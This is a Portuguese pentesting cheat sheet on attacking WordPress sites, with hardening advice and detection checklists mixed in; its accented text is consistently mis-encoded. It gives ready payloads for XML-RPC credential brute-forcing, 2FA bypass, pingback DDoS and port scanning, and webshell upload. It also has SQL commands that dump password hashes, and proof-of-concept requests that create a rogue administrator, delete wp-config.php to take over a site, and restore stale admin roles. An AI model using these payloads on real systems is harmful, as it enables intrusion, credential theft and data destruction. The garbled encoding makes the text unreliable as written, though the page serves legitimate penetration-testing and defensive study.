# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

- **Arquivos enviados** v√£o para: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Arquivos de temas podem ser encontrados em /wp-content/themes/,** ent√£o se voc√™ alterar algum php do tema para obter RCE provavelmente usar√° esse caminho. Por exemplo: Usando **tema twentytwelve** voc√™ pode **acessar** o arquivo **404.php** em: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Outra URL √∫til pode ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Em **wp-config.php** voc√™ pode encontrar a senha root do banco de dados.
- Caminhos de login padr√£o para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principais arquivos do WordPress**

- `index.php`
- `license.txt` cont√©m informa√ß√µes √∫teis como a vers√£o do WordPress instalada.
- `wp-activate.php` √© usado no processo de ativa√ß√£o por e-mail ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocult√°-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` √© um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos com HTTP atuando como o mecanismo de transporte e XML como o mecanismo de codifica√ß√£o. Esse tipo de comunica√ß√£o foi substitu√≠do pela WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- A pasta `wp-content` √© o diret√≥rio principal onde plugins e temas s√£o armazenados.
- `wp-content/uploads/` √© o diret√≥rio onde quaisquer arquivos enviados para a plataforma s√£o armazenados.
- `wp-includes/` √© o diret√≥rio onde arquivos do n√∫cleo s√£o armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Em vers√µes do WordPress 5.5 e superiores, o WordPress gera um arquivo sitemap XML com todas as publica√ß√µes p√∫blicas e tipos de post e taxonomias consult√°veis publicamente.

**P√≥s-explora√ß√£o**

- O arquivo `wp-config.php` cont√©m informa√ß√µes necess√°rias para o WordPress conectar-se ao banco de dados, como o nome do banco, host do banco, usu√°rio e senha, chaves de autentica√ß√£o e salts, e o prefixo das tabelas do banco. Esse arquivo de configura√ß√£o tamb√©m pode ser usado para ativar o modo DEBUG, o que pode ser √∫til para resolver problemas.

### Permiss√µes de Usu√°rios

- **Administrador**
- **Editor**: Publica e gerencia seus pr√≥prios posts e os de outros
- **Autor**: Publica e gerencia seus pr√≥prios posts
- **Colaborador**: Escreve e gerencia seus posts, mas n√£o pode public√°-los
- **Assinante**: Visualiza posts e edita seu perfil

## **Enumera√ß√£o Passiva**

### **Obter vers√£o do WordPress**

Verifique se consegue encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **c√≥digo-fonte** da p√°gina (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Arquivos de link CSS

![](<../../images/image (533).png>)

- Arquivos JavaScript

![](<../../images/image (524).png>)

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair vers√µes em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumera√ß√£o ativa

### Plugins and Themes

Voc√™ provavelmente n√£o conseguir√° encontrar todos os Plugins and Themes poss√≠veis. Para descobrir todos eles, voc√™ precisar√° **realizar ativamente um Brute Force em uma lista de Plugins and Themes** (esperan√ßosamente existem ferramentas automatizadas que contenham essas listas).

### Usu√°rios

- **ID Brute:** Voc√™ obt√©m usu√°rios v√°lidos de um site WordPress ao Brute Forcing IDs de usu√°rios:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id √© **v√°lido**. Se a resposta for **400**, ent√£o o id √© **inv√°lido**.

- **wp-json:** Voc√™ tamb√©m pode tentar obter informa√ß√µes sobre os usu√°rios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro `/wp-json/` endpoint que pode revelar algumas informa√ß√µes sobre usu√°rios √©:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Somente informa√ß√µes sobre os usu√°rios que t√™m esse recurso habilitado ser√£o fornecidas**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Ao fazer login em **`/wp-login.php`**, a **mensagem** √© **diferente**, indicando se o **username** existe ou n√£o.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (Voc√™ pode automatizar esse processo [using this](https://github.com/relarizky/wpxploit), por exemplo).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Verificar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** s√£o alguns dos m√©todos que podem ser usados para brute-force credentials. Se voc√™ encontrar qualquer um deles, pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Incorrect username or password"_ em uma resposta com c√≥digo 200 deve aparecer se as credenciais n√£o forem v√°lidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credenciais corretas, voc√™ pode fazer upload de um arquivo. Na resposta, o caminho aparecer√° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force creds using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este m√©todo √© destinado a programas e n√£o a humanos, e √© antigo; portanto n√£o suporta 2FA. Assim, se voc√™ tem creds v√°lidas mas a entrada principal est√° protegida por 2FA, **voc√™ pode conseguir abusar de xmlrpc.php para fazer login com essas creds contornando o 2FA**. Note que voc√™ n√£o conseguir√° realizar todas as a√ß√µes que pode fazer pelo console, mas ainda assim pode chegar a RCE como o Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se voc√™ obtiver **faultCode** com um valor **maior** que **0** (17), isso significa que a porta est√° aberta.

Veja o uso de **`system.multicall`** na se√ß√£o anterior para aprender como abusar desse m√©todo para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo geralmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando esse arquivo √© **accessed**, uma consulta MySQL "**heavy**" √© executada, ent√£o ele pode ser usado por **attackers** para **cause** um **DoS**.\
Al√©m disso, por padr√£o, o `wp-cron.php` √© chamado a cada carregamento de p√°gina (sempre que um cliente solicita qualquer p√°gina do Wordpress), o que em sites de alto tr√°fego pode causar problemas (DoS).

Recomenda-se desabilitar o Wp-Cron e criar um cronjob real no host que execute as a√ß√µes necess√°rias em intervalos regulares (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o Worpress site pode fazer uma requisi√ß√£o para voc√™.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se o **methodName: pingback.ping** e o path **/wp-json/oembed/1.0/proxy** existem e, se existirem, tenta explor√°-los.

## Ferramentas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais uma curiosidade do que um ataque real. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) voc√™ podia inverter 1 bit em qualquer arquivo wordpress. Ent√£o voc√™ podia inverter a posi√ß√£o `5389` do arquivo `/var/www/html/wp-includes/user.php` para transformar a opera√ß√£o NOT (`!`) em NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um php do tema usado (s√£o necess√°rias credenciais de admin)**

Apar√™ncia ‚Üí Editor de Tema ‚Üí Template 404 (√† direita)

Altere o conte√∫do para um php shell:

![](<../../images/image (384).png>)

Pesquise na internet como acessar essa p√°gina atualizada. Neste caso voc√™ deve acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Voc√™ pode usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sess√£o.

## RCE em plugin

### Plugin PHP

Pode ser poss√≠vel enviar arquivos .php como um plugin.\
Crie seu backdoor em php usando, por exemplo:

![](<../../images/image (183).png>)

Depois adicione um novo plugin:

![](<../../images/image (722).png>)

Fa√ßa upload do plugin e pressione Install Now:

![](<../../images/image (249).png>)

Clique em Procced:

![](<../../images/image (70).png>)

Provavelmente isso aparentemente n√£o far√° nada, mas se voc√™ for em Media, ver√° seu shell carregado:

![](<../../images/image (462).png>)

Acesse-o e voc√™ ver√° a URL para executar o reverse shell:

![](<../../images/image (1006).png>)

### Enviar e ativar plugin malicioso

Este m√©todo envolve a instala√ß√£o de um plugin malicioso conhecido por ser vulner√°vel e que pode ser explorado para obter um web shell. Esse processo √© realizado atrav√©s do WordPress dashboard da seguinte forma:

1. **Plugin Acquisition**: O plugin √© obtido de uma fonte como Exploit DB, por exemplo [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instala√ß√£o do Plugin**:
- Navegue at√© o WordPress dashboard, ent√£o v√° para `Dashboard > Plugins > Upload Plugin`.
- Fa√ßa upload do arquivo zip do plugin baixado.
3. **Ativa√ß√£o do Plugin**: Uma vez que o plugin seja instalado com sucesso, ele deve ser ativado atrav√©s do dashboard.
4. **Explora√ß√£o**:
- Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado por ser conhecido como vulner√°vel.
- O Metasploit framework fornece um exploit para essa vulnerabilidade. Carregando o m√≥dulo apropriado e executando comandos espec√≠ficos, uma sess√£o meterpreter pode ser estabelecida, concedendo acesso n√£o autorizado ao site.
- Observa-se que este √© apenas um dos muitos m√©todos para explorar um site WordPress.

O conte√∫do inclui aux√≠lios visuais que mostram os passos no WordPress dashboard para instalar e ativar o plugin. Entretanto, √© importante notar que explorar vulnerabilidades dessa maneira √© ilegal e anti√©tico sem a devida autoriza√ß√£o. Essas informa√ß√µes devem ser usadas de forma respons√°vel e somente em um contexto legal, como pentesting com permiss√£o expl√≠cita.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS para RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ √© um script projetado para escalar uma vulnerabilidade de **Cross-Site Scripting (XSS)** para **Remote Code Execution (RCE)** ou outras vulnerabilidades cr√≠ticas no WordPress. Para mais info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele fornece **suporte para vers√µes do WordPress 6.X.X, 5.X.X and 4.X.X. e permite:**
- _**Privilege Escalation:**_ Cria um usu√°rio no WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Faz upload do seu plugin customizado (backdoor) para o WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita um Built-In Plugin no WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita um Built-In Theme no WordPress.
- _**(Custom) Custom Exploits:**_ Exploits customizados para Third-Party WordPress Plugins/Themes.

## P√≥s-Explora√ß√£o

Extrair nomes de usu√°rio e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar a senha do admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superf√≠cie de Ataque

Saber como um plugin do Wordpress pode expor funcionalidades √© fundamental para encontrar vulnerabilidades nessas funcionalidades. Voc√™ pode ver como um plugin pode expor funcionalidades nos pontos a seguir e alguns exemplos de plugins vulner√°veis em [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das formas de um plugin expor fun√ß√µes para usu√°rios √© via AJAX handlers. Eles podem conter bugs de l√≥gica, autoriza√ß√£o ou autentica√ß√£o. Al√©m disso, √© bastante frequente que essas fun√ß√µes baseiem tanto a autentica√ß√£o quanto a autoriza√ß√£o na exist√™ncia de um Wordpress nonce que **qualquer usu√°rio autenticado na inst√¢ncia do Wordpress pode ter** (independentemente do seu papel).

Estas s√£o as fun√ß√µes que podem ser usadas para expor uma fun√ß√£o em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acess√≠vel a quaisquer usu√°rios (at√© mesmo n√£o autenticados).**

> [!CAUTION]
> Al√©m disso, se a fun√ß√£o apenas verifica a autoriza√ß√£o do usu√°rio com a fun√ß√£o `wp_verify_nonce`, essa fun√ß√£o s√≥ verifica se o usu√°rio est√° logado; normalmente n√£o verifica o papel do usu√°rio. Portanto, usu√°rios com privil√©gios baixos podem ter acesso a a√ß√µes de alto privil√©gio.

- **REST API**

Tamb√©m √© poss√≠vel expor fun√ß√µes do WordPress registrando uma REST API usando a fun√ß√£o `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
O `permission_callback` √© uma fun√ß√£o de callback que verifica se um dado usu√°rio est√° autorizado a chamar o m√©todo da API.

**Se a fun√ß√£o integrada `__return_true` for usada, ela simplesmente pular√° a verifica√ß√£o de permiss√µes do usu√°rio.**

- **Acesso direto ao arquivo php**

Claro, Wordpress usa PHP e os arquivos dentro dos plugins s√£o diretamente acess√≠veis pela web. Portanto, caso um plugin exponha alguma funcionalidade vulner√°vel que seja acionada apenas ao acessar o arquivo, ela poder√° ser explorada por qualquer usu√°rio.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Alguns plugins implementam atalhos de ‚Äútrusted header‚Äù para integra√ß√µes internas ou reverse proxies e ent√£o usam esse header para definir o contexto do usu√°rio atual para requisi√ß√µes REST. Se o header n√£o for vinculado criptograficamente √† requisi√ß√£o por um componente upstream, um atacante pode forjar ele e atingir rotas REST privilegiadas como administrador.

- Impacto: escalada de privil√©gio n√£o autenticada para admin ao criar um novo administrador via a rota REST core users.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (for√ßa o user ID 1, tipicamente a primeira conta de administrador).
- Rota explorada: `POST /wp-json/wp/v2/users` com um array de role elevado.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por que funciona

- O plugin mapeia um cabe√ßalho controlado pelo cliente para o estado de autentica√ß√£o e ignora verifica√ß√µes de capability.
- O core do WordPress espera a capability `create_users` para esta rota; o hack do plugin contorna isso definindo diretamente o contexto do usu√°rio atual a partir do cabe√ßalho.

Indicadores de sucesso esperados

- HTTP 201 com um corpo JSON descrevendo o usu√°rio criado.
- Um novo usu√°rio administrador vis√≠vel em `wp-admin/users.php`.

Lista de verifica√ß√£o para detec√ß√£o

- Procure por `getallheaders()`, `$_SERVER['HTTP_...']`, ou SDKs de terceiros que leem cabe√ßalhos customizados para definir o contexto do usu√°rio (por exemplo, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revise os registros REST em busca de callbacks privilegiados que n√£o possuem verifica√ß√µes robustas de `permission_callback` e que em vez disso dependem de cabe√ßalhos da requisi√ß√£o.
- Procure usos de fun√ß√µes core de gerenciamento de usu√°rios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que s√£o protegidos apenas por valores de cabe√ßalho.

Endurecimento

- Nunca derive autentica√ß√£o ou autoriza√ß√£o a partir de cabe√ßalhos controlados pelo cliente.
- Se um reverse proxy precisar injetar identidade, termine a confian√ßa no proxy e remova c√≥pias recebidas (e.g., `unset X-Wcpay-Platform-Checkout-User` na borda), depois passe um token assinado e verifique-o no servidor.
- Para rotas REST que realizam a√ß√µes privilegiadas, exija verifica√ß√µes `current_user_can()` e um `permission_callback` estrito (N√ÉO use `__return_true`).
- Prefira autentica√ß√£o first-party (cookies, application passwords, OAuth) em vez de ‚Äúimpersonation‚Äù via cabe√ßalho.

Refer√™ncias: veja os links no final desta p√°gina para um caso p√∫blico e uma an√°lise mais ampla.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introduzidos por este trecho:

* **Acesso n√£o autenticado** ‚Äì o `wp_ajax_nopriv_` hook est√° registrado.
* **Sem verifica√ß√£o de nonce / capability** ‚Äì qualquer visitante pode acessar o endpoint.
* **Sem sanitiza√ß√£o do caminho** ‚Äì a string `fontfamily` controlada pelo usu√°rio √© concatenada a um caminho do filesystem sem filtragem, permitindo o cl√°ssico `../../` traversal.

#### Explora√ß√£o

Um atacante pode excluir qualquer arquivo ou diret√≥rio **abaixo do diret√≥rio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma √∫nica requisi√ß√£o HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Porque `wp-config.php` fica fora de *uploads*, quatro sequ√™ncias de `../` s√£o suficientes em uma instala√ß√£o padr√£o. Deletar `wp-config.php` for√ßa o WordPress a entrar no *installation wizard* na pr√≥xima visita, permitindo a tomada completa do site (o atacante apenas fornece uma nova configura√ß√£o de DB e cria um usu√°rio admin).

Outros alvos impactantes incluem arquivos `.php` de plugin/theme (para quebrar security plugins) ou regras `.htaccess`.

#### Checklist de detec√ß√£o

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que chame helpers do sistema de arquivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatena√ß√£o de input de usu√°rio n√£o sanitizado em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Aus√™ncia de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

#### Endurecimento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Sempre** trate qualquer opera√ß√£o de escrita/remo√ß√£o no disco como privilegiada e verifique duas vezes:
> ‚Ä¢ Autentica√ß√£o  ‚Ä¢ Autoriza√ß√£o  ‚Ä¢ Nonce  ‚Ä¢ Sanitiza√ß√£o da entrada  ‚Ä¢ Conten√ß√£o de caminho (ex.: via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via restaura√ß√£o de fun√ß√µes obsoletas e autoriza√ß√£o ausente (ASE "View Admin as Role")

Muitos plugins implementam um recurso de "view as role" ou troca tempor√°ria de fun√ß√£o salvando a(s) fun√ß√£o(√µes) originais em user meta para que possam ser restauradas depois. Se o caminho de restaura√ß√£o depender apenas de par√¢metros de requisi√ß√£o (por exemplo, `$_REQUEST['reset-for']`) e de uma lista mantida pelo plugin sem verificar capabilities e um nonce v√°lido, isso se torna uma escalada vertical de privil√©gios.

Um exemplo real foi encontrado no plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). O ramo de reset restaurava fun√ß√µes com base em `reset-for=<username>` se o username aparecesse em um array interno `$options['viewing_admin_as_role_are']`, mas n√£o executava nem um `current_user_can()` nem uma verifica√ß√£o de nonce antes de remover as fun√ß√µes atuais e re-adicionar as fun√ß√µes salvas em user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por que √© explor√°vel

- Confia em `$_REQUEST['reset-for']` e em uma op√ß√£o do plugin sem autoriza√ß√£o no lado do servidor.
- Se um usu√°rio anteriormente tinha privil√©gios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaur√°-los acessando o reset path.
- Em algumas implanta√ß√µes, qualquer usu√°rio autenticado poderia acionar um reset para outro nome de usu√°rio ainda presente em `viewing_admin_as_role_are` (autoriza√ß√£o quebrada).

Pr√©-requisitos do ataque

- Vers√£o vulner√°vel do plugin com o recurso ativado.
- A conta alvo tem uma role de alto privil√©gio obsoleta armazenada em user meta de uso anterior.
- Qualquer sess√£o autenticada; aus√™ncia de nonce/capability no fluxo de reset.

Explora√ß√£o (exemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em builds vulner√°veis isso remove as fun√ß√µes atuais e readiciona as fun√ß√µes originais salvas (por exemplo, `administrator`), escalando privil√©gios.

Checklist de detec√ß√£o

- Procure por recursos de troca de fun√ß√£o que persistam ‚Äúfun√ß√µes originais‚Äù em user meta (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique caminhos de reset/restore que:
- Leem nomes de usu√°rio de `$_REQUEST` / `$_GET` / `$_POST`.
- Modificam fun√ß√µes via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizam com base em um array de op√ß√£o do plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

Mitiga√ß√µes

- Implemente verifica√ß√µes de capability em cada ramo que altere estado (por exemplo, `current_user_can('manage_options')` ou mais restrito).
- Exija nonces para todas as muta√ß√µes de fun√ß√£o/permiss√£o e verifique-os: `check_admin_referer()` / `wp_verify_nonce()`.
- Nunca confie em nomes de usu√°rio fornecidos pela requisi√ß√£o; resolva o usu√°rio alvo no servidor com base no ator autenticado e em uma pol√≠tica expl√≠cita.
- Invalide o estado de ‚Äúfun√ß√µes originais‚Äù em atualiza√ß√µes de perfil/fun√ß√£o para evitar restaura√ß√£o obsoleta de privil√©gios elevados:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
Considere armazenar o m√≠nimo de estado e usar tokens com dura√ß√£o limitada, protegidos por capability, para trocas tempor√°rias de fun√ß√£o.

---

### Considera√ß√µes de WAF para WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‚Äëimpact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Notas ofensivas

- Mire endpoints espec√≠ficos do plugin com payloads limpos: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste primeiro caminhos n√£o autenticados (AJAX `nopriv`, REST com `permission_callback` permissivo, shortcodes p√∫blicos). Payloads padr√£o frequentemente funcionam sem obfusca√ß√£o.
- Casos t√≠picos de alto impacto: eleva√ß√£o de privil√©gios (broken access control), arbitrary file upload/download, LFI, open redirect.

Notas defensivas

- N√£o confie em assinaturas gen√©ricas de WAF para proteger CVEs de plugins. Implemente patches virtuais espec√≠ficos de vulnerabilidade na camada de aplica√ß√£o ou atualize rapidamente.
- Prefira checagens de seguran√ßa positivas no c√≥digo (capabilities, nonces, valida√ß√£o estrita de entrada) em vez de filtros regex negativos.

## Prote√ß√£o do WordPress

### Atualiza√ß√µes regulares

Certifique-se de que WordPress, plugins e themes est√£o atualizados. Tamb√©m confirme que a atualiza√ß√£o autom√°tica est√° habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Al√©m disso, **instale apenas plugins e temas WordPress confi√°veis**.

### Plugins de Seguran√ßa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomenda√ß√µes**

- Remova o usu√°rio padr√£o **admin**
- Use **senhas fortes** e **2FA**
- **Revise** periodicamente as **permiss√µes** dos usu√°rios
- **Limite tentativas de login** para prevenir ataques de Brute Force
